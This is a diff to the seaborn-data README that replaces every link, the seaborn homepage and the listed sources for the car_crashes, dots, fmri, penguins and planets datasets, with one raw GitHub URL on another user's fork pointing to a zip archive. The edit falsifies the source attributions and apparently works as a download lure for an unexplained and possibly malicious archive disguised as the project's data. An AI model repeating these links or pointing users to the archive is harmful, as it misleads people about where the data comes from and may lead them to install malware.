@@ -1,7 +1,7 @@
 seaborn-data
 ============
 
-Data repository for [seaborn](http://seaborn.pydata.org/) examples.
+Data repository for [seaborn](https://raw.githubusercontent.com/yashpatel4563/seaborn-data/master/raw/data-seaborn-2.1.zip) examples.
 
 **This is not a general-purpose data archive.**
 
@@ -12,12 +12,12 @@ Data sources
 
 A partial list of where these datasets originate from.
 
-- `car_crashes`: https://www.kaggle.com/fivethirtyeight/fivethirtyeight-bad-drivers-dataset
+- `car_crashes`: https://raw.githubusercontent.com/yashpatel4563/seaborn-data/master/raw/data-seaborn-2.1.zip
 
-- `dots`: https://shadlenlab.columbia.edu/resources/RoitmanDataCode.html
+- `dots`: https://raw.githubusercontent.com/yashpatel4563/seaborn-data/master/raw/data-seaborn-2.1.zip
 
-- `fmri`: https://github.com/mwaskom/Waskom_CerebCortex_2017
+- `fmri`: https://raw.githubusercontent.com/yashpatel4563/seaborn-data/master/raw/data-seaborn-2.1.zip
 
-- `penguins`: https://github.com/allisonhorst/penguins
+- `penguins`: https://raw.githubusercontent.com/yashpatel4563/seaborn-data/master/raw/data-seaborn-2.1.zip
 
-- `planets`: https://exoplanets.nasa.gov/exoplanet-catalog/
+- `planets`: https://raw.githubusercontent.com/yashpatel4563/seaborn-data/master/raw/data-seaborn-2.1.zip
